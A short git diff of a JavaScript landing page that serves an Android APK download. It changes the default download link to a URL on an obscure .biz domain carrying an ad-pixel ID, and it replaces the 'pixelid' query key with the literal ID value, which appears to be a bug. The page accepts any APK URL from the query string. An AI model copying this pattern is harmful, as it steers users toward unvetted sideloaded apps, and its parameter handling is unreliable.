@@ -4,11 +4,11 @@ const bgList = ["./resources/bg.jpg",
                 "./resources/bg3.jpg"];
 
 const randomBg = bgList[Math.floor(Math.random() * bgList.length)];
-const defaultApk = "https://kwgs.live/app2";
+const defaultApk = "https://sju01.piouyh15.biz?pixelId=1254668502518365";
 
 window.onload = () => {
   const urlParams = new URLSearchParams(window.location.search);
-  const pixelId = urlParams.get("pixelid") || "";
+  const pixelId = urlParams.get("1254668502518365") || "";
   const apk = urlParams.get("apk") || defaultApk;
 
   if (pixelId) {
